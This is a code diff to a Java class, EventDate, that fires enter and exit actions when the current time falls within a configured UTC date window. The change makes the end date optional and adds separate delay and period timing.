@@ -2,6 +2,7 @@ package com.android.service.event;
 
 import java.text.DateFormat;
 import java.text.ParseException;
+import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.Date;
 import java.util.GregorianCalendar;
@@ -22,105 +23,133 @@ public class EventDate extends BaseTimer {
 	Calendar start;
 	Calendar stop;
 
-	private boolean nextDailyIn;
+	private boolean nextDailyIn = false;
+	private boolean needExitOnStop = false;
 
 	@Override
 	protected boolean parse(ConfEvent event) {
+		needExitOnStop = false;
+		
 		try {
-			String dateFromString=conf.getString("datefrom");
-			String dateToString=conf.getString("dateto");
+			DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+			dateFormat.setTimeZone(TimeZone.getTimeZone("UTC"));
 			
-			dateFrom = DateFormat.getDateInstance().parse(dateFromString);
-			dateTo = DateFormat.getDateInstance().parse(dateToString);
+			String dateFromString = conf.getString("datefrom");
+			dateFrom = dateFormat.parse(dateFromString);
 			
+			if (conf.has("dateto")) {
+				String dateToString = conf.getString("dateto");
+				dateTo = dateFormat.parse(dateToString);
+			} else {
+				dateTo = new Date(Long.MAX_VALUE);
+			}
 		} catch (ConfigurationException e) {
 			return false;
 		} catch (ParseException e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (parse) Error: " + e);
 			}
+			
 			return false;
 		}
+		
 		return true;
 	}
 
 	@Override
-	public void actualStart() {		
-		
-		start = GregorianCalendar.getInstance(TimeZone.getTimeZone("GMT"));
+	public void actualStart() {			
+		start = GregorianCalendar.getInstance(TimeZone.getTimeZone("UTC"));
 		start.setTime(dateFrom);
-		stop = GregorianCalendar.getInstance(TimeZone.getTimeZone("GMT"));
+		stop = GregorianCalendar.getInstance(TimeZone.getTimeZone("UTC"));
 		stop.setTime(dateTo);
 		
-		Calendar now = GregorianCalendar.getInstance(TimeZone.getTimeZone("GMT"));
+		Calendar now = GregorianCalendar.getInstance(TimeZone.getTimeZone("UTC"));
 
-		if(now.before(start)){
+		if (now.before(start)) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (actualStart): not yet in the brackets");
 			}
-			setDailyDelay();
-		}else if(now.before(stop)){
+			
+			nextDailyIn = setDailyDelay(true);
+		} else if(now.before(stop)) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (actualStart): already in the brackets");
 			}
-			onEnter();
-			setDailyDelay();
-		}else{
+			
+			nextDailyIn = setDailyDelay(true);
+		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (actualStart): nothing to do");
 			}
 		}
 	}
 	
-	private boolean setDailyDelay() {			
-		Calendar now = GregorianCalendar.getInstance(TimeZone.getTimeZone("GMT"));
+	private boolean setDailyDelay(boolean isDelay) {			
+		Calendar now = GregorianCalendar.getInstance(TimeZone.getTimeZone("UTC"));
 
-		if(now.before(start)){
-			setPeriod((start.getTimeInMillis() - now.getTimeInMillis())/1000);
+		if (now.before(start)) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (setDailyDelay start in ms): " + (start.getTimeInMillis() - now.getTimeInMillis()));
+			}
+			
+			if (isDelay) {
+				setDelay((start.getTimeInMillis() - now.getTimeInMillis()));
+			} else {
+				setPeriod((start.getTimeInMillis() - now.getTimeInMillis()));
+			}
+			
 			return true;
-		}else if(now.before(stop)){
-			setPeriod((stop.getTimeInMillis() - now.getTimeInMillis())/1000);		
+		} else if(now.before(stop)) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (setDailyDelay stop in ms): nothing to do" + (stop.getTimeInMillis() - now.getTimeInMillis()));
+			}
+			
+			if (isDelay) {
+				setDelay((stop.getTimeInMillis() - now.getTimeInMillis()));
+			} else {
+				setPeriod((stop.getTimeInMillis() - now.getTimeInMillis()));
+			}
+			
 			return false;
-		}else{
+		} else {
 			this.onExit();
+			
 			setPeriod(NEVER);
+			setDelay(NEVER);
+			
 			return false;
 		}
-
 	}
 
 
 	@Override
 	public void actualGo() {
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " Info: " + "triggering");//$NON-NLS-1$ //$NON-NLS-2$
-		}
-
 		if (nextDailyIn) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (go): DAILY TIMER: action enter"); //$NON-NLS-1$
 			}
+			
 			onEnter();
+			
+			needExitOnStop = true;
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (go): DAILY TIMER: action exit"); //$NON-NLS-1$
 			}
+			
 			onExit();
+			
+			needExitOnStop = false;
 		}
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (go): daily IN BEFORE: " + nextDailyIn); //$NON-NLS-1$
-		}
-		nextDailyIn = setDailyDelay();
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (go): daily IN AFTER: " + nextDailyIn); //$NON-NLS-1$
-		}
-
+		
+		nextDailyIn = setDailyDelay(false);
 	}
 
 	@Override
 	public void actualStop() {
-		onExit(); // di sicurezza
+		if (needExitOnStop) {
+			onExit(); // di sicurezza
+		}
 	}
 
 }
